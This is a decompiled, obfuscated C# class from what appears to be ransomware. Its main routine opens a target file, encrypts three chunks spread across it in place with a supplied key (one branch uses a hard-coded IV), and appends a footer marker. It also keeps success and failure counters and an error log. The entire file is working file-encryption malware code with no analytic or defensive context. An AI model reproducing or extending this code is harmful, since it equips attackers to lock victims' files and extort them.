using System;
using System.IO;
using System.Text;
using QFSLrCXCNYPIKJ;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class kLhUdzwWYwiYO
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int HbRDwYpdvfKz(long long_0)
	{
		return (int)long_0;
	}

	public static bool vhbsEfgZLCUjss(string ZUWzpbMTEVO, string JPnhStmBvZaOgAo, string oAOzkZJQQFAvleDU, byte[] wXJXYGSDUtHzXGP = null, byte[] gjNjjbfneCEdDEz = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(ZUWzpbMTEVO, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = HbRDwYpdvfKz(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(JPnhStmBvZaOgAo) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(JPnhStmBvZaOgAo) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(JPnhStmBvZaOgAo) * 1024 * 1024) / 10;
				}
				int aZSOAuEVxZLOGd = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = iIsueKZQcGgVC(ZUWzpbMTEVO, fileStream, aZSOAuEVxZLOGd, num * i);
					array = (ACJZwXMCdgNnIA.OTLCmOpFsMP ? mbmsUAuYimuL.UGIyKRILFxs(byte_, Convert.FromBase64String(oAOzkZJQQFAvleDU), gjNjjbfneCEdDEz) : PsMAbAPGwNaiG.ddDsnuGdyRxS(byte_, Convert.FromBase64String(oAOzkZJQQFAvleDU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					qxmIUiuBZMVj(ZUWzpbMTEVO, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (ACJZwXMCdgNnIA.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107377807)) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378823)) + Convert.ToString(JPnhStmBvZaOgAo) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378823))) : Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107377807)) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378800)) + Convert.ToString(JPnhStmBvZaOgAo) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378800))));
			if (!ACJZwXMCdgNnIA.UpNccIaFzBadyA)
			{
				using FileStream fileStream2 = new FileStream(ZUWzpbMTEVO, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(ZUWzpbMTEVO, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(wXJXYGSDUtHzXGP, 0, wXJXYGSDUtHzXGP.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (ACJZwXMCdgNnIA.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(ACJZwXMCdgNnIA.bDDJFCkjBbYQ, getString_0(107398675) + ZUWzpbMTEVO + getString_0(107377826) + ex.Message + getString_0(107396757));
				}
				catch (Exception)
				{
				}
			}
			ACJZwXMCdgNnIA.ZzaknwGiCeEd++;
			return false;
		}
		ACJZwXMCdgNnIA.DPjjDEUnrYJ++;
		return true;
	}

	public static byte[] iIsueKZQcGgVC(string dyNHtQVktYf, FileStream PyhCvZuVnHlYCxX, int AZSOAuEVxZLOGd, int wuJSWMRsJJA = 0)
	{
		byte[] array = new byte[AZSOAuEVxZLOGd];
		PyhCvZuVnHlYCxX.Position = wuJSWMRsJJA;
		PyhCvZuVnHlYCxX.Read(array, 0, AZSOAuEVxZLOGd);
		return array;
	}

	public static void qxmIUiuBZMVj(string bNcOkBCskYv, FileStream LBSGKCxrDIX, byte[] BFTSCcnAZNk, int KgLHjwGpUd = 0)
	{
		LBSGKCxrDIX.Position = KgLHjwGpUd;
		LBSGKCxrDIX.Write(BFTSCcnAZNk, 0, BFTSCcnAZNk.Length);
	}

	static kLhUdzwWYwiYO()
	{
		Strings.CreateGetStringDelegate(typeof(kLhUdzwWYwiYO));
	}
}
